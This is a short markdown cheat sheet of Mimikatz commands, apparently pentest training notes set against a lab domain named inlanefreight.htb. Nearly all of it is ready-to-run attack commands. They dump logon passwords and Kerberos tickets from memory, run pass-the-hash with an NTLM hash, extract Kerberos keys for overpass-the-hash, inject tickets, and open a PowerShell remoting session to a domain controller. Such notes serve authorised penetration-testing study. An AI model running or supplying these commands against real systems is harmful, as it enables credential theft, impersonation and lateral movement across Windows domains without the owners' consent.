Attacks: #PtH #PtT 
# Modules
## Logon Passwords
```powershell
PS > .\mimikatz.exe privilege::debug "sekurlsa::logonpasswords" exit
```
## Export Tickets
```powershell
PS > .\mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
```
# Pass the Hash
Following are required:
- `/user` to authenticate as
- `/rc4` or `/NTLM` hash of the user's password.
- `/domain` the user to impersonate belongs to. If it's local user account, use the computer name, localhost, or a dot (.).
- `/run` - Program to run with the user's context (default cmd.exe).
```powershell
PS > mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<RC4/NTLM HASH> /domain:<domain> /run:cmd.exe" exit
```

# Pass the Key / OverPass the Hash
## Extract Kerberos Keys
```powershell
PS > .\mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
```

```powershell
PS > mimikatz.exe privilege::debug "/domain:inlanefreight.htb /user:plaintext /ntlm:<HASH>" exit
```

```powershell
PS > mimikatz.exe privilege::debug 'kerberos::ptt "C:\Path\to\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"' exit
```
>**Note:** Instead of opening mimikatz.exe with `cmd.exe` and exiting to get the ticket into the current command prompt, we can use the  `misc` module to launch a new command prompt window with the imported ticket using the `misc::cmd` command.

>**Note:** Mimikatz requires administrative rights for Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

# Powershell Remoting with PtT
```powershell
PS > mimikatz.exe privilege::debug 'kerberos::ptt "C:\Path\to\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"' exit
PS > Enter-PSSession -ComputerName DC01
```